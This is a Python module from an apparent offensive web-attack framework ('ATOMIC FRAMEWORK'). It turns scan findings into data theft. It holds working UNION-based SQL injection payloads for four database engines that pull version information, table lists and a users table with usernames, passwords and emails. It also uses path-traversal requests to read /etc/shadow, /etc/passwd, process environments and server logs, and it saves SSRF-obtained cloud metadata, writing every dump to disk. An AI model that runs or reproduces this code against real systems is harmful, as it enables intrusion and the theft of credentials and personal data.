#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Data Dumper Module
Database extraction and data dumping
"""

import os
import sys
import re

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import Config, Colors


class DataDumper:
    """Data Extraction Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.dump_dir = os.path.join(Config.REPORTS_DIR, 'dumps')
        os.makedirs(self.dump_dir, exist_ok=True)
    
    def run(self, findings: list):
        """Attempt to dump data based on findings"""
        print(f"{Colors.info('Attempting data extraction...')}")
        
        for finding in findings:
            if 'SQL Injection' in finding.technique:
                self._dump_sql(finding)
            elif 'LFI' in finding.technique:
                self._dump_lfi(finding)
            elif 'SSRF' in finding.technique and 'Metadata' in finding.technique:
                self._dump_ssrf_metadata(finding)
    
    def _dump_sql(self, finding):
        """Attempt SQL injection data dump"""
        url = finding.url
        param = finding.param
        
        print(f"{Colors.info(f'Attempting SQL dump from {url}')}")
        
        # Determine database type
        db_type = 'mysql'
        if 'PostgreSQL' in finding.technique:
            db_type = 'postgresql'
        elif 'MSSQL' in finding.technique:
            db_type = 'mssql'
        elif 'Oracle' in finding.technique:
            db_type = 'oracle'
        
        # Get database info
        db_info = self._get_db_info(url, param, db_type)
        if db_info:
            self._save_dump('db_info', db_info)
            print(f"{Colors.success('Database info extracted')}")
        
        # Get tables
        tables = self._get_tables(url, param, db_type)
        if tables:
            self._save_dump('tables', tables)
            print(f"{Colors.success(f'Tables extracted: {len(tables)}')}")
        
        # Get users (common target)
        users = self._dump_table(url, param, db_type, 'users', ['username', 'password', 'email'])
        if users:
            self._save_dump('users', users)
            print(f"{Colors.success(f'Users extracted: {len(users)}')}")
    
    def _get_db_info(self, url: str, param: str, db_type: str) -> dict:
        """Get database information"""
        queries = {
            'mysql': [
                "' UNION SELECT @@version,user(),database(),4,5 --",
                "' UNION SELECT version(),current_user(),database(),4,5 --",
            ],
            'postgresql': [
                "' UNION SELECT version(),current_user,current_database(),4,5 --",
            ],
            'mssql': [
                "' UNION SELECT @@version,SYSTEM_USER,DB_NAME(),4,5 --",
            ],
            'oracle': [
                "' UNION SELECT (SELECT banner FROM v$version WHERE rownum=1),user,global_name,4,5 FROM global_name --",
            ],
        }
        
        for query in queries.get(db_type, queries['mysql']):
            try:
                data = {param: query}
                response = self.requester.request(url, 'POST', data=data)
                
                if response:
                    return {
                        'query': query,
                        'response': response.text,
                    }
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'DB info error: {e}')}")
        
        return None
    
    def _get_tables(self, url: str, param: str, db_type: str) -> list:
        """Get database tables"""
        queries = {
            'mysql': "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database() --",
            'postgresql': "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema='public' --",
            'mssql': "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables --",
            'oracle': "' UNION SELECT table_name,2,3,4,5 FROM user_tables --",
        }
        
        query = queries.get(db_type, queries['mysql'])
        
        try:
            data = {param: query}
            response = self.requester.request(url, 'POST', data=data)
            
            if response:
                # Parse tables from response
                tables = re.findall(r'[\w_]+', response.text)
                return list(set(tables))
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'Tables error: {e}')}")
        
        return []
    
    def _dump_table(self, url: str, param: str, db_type: str, table: str, columns: list) -> list:
        """Dump table data"""
        col_str = ','.join(columns)
        
        queries = {
            'mysql': f"' UNION SELECT {col_str},4,5 FROM {table} --",
            'postgresql': f"' UNION SELECT {col_str},4,5 FROM {table} --",
            'mssql': f"' UNION SELECT {col_str},4,5 FROM {table} --",
            'oracle': f"' UNION SELECT {col_str},4,5 FROM {table} --",
        }
        
        query = queries.get(db_type, queries['mysql'])
        
        try:
            data = {param: query}
            response = self.requester.request(url, 'POST', data=data)
            
            if response:
                # Parse data from response
                return [response.text]
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'Table dump error: {e}')}")
        
        return []
    
    def _dump_lfi(self, finding):
        """Dump files via LFI"""
        url = finding.url
        param = finding.param
        
        files_to_dump = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/proc/self/environ',
            '/proc/self/cmdline',
        ]
        
        for file_path in files_to_dump:
            try:
                data = {param: f"../../../{file_path}"}
                response = self.requester.request(url, 'GET', data=data)
                
                if response and len(response.text) > 10:
                    self._save_dump(file_path.replace('/', '_'), response.text)
                    print(f"{Colors.success(f'Dumped: {file_path}')}")
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'LFI dump error: {e}')}")
    
    def _dump_ssrf_metadata(self, finding):
        """Dump cloud metadata"""
        if finding.extracted_data:
            self._save_dump('cloud_metadata', finding.extracted_data)
            print(f"{Colors.success('Cloud metadata saved')}")
    
    def _save_dump(self, name: str, data):
        """Save dump to file"""
        filename = f"{self.engine.scan_id}_{name}.txt"
        filepath = os.path.join(self.dump_dir, filename)
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                if isinstance(data, (list, dict)):
                    import json
                    f.write(json.dumps(data, indent=2))
                else:
                    f.write(str(data))
            
            print(f"{Colors.info(f'Dump saved: {filepath}')}")
        except Exception as e:
            print(f"{Colors.error(f'Save dump error: {e}')}")
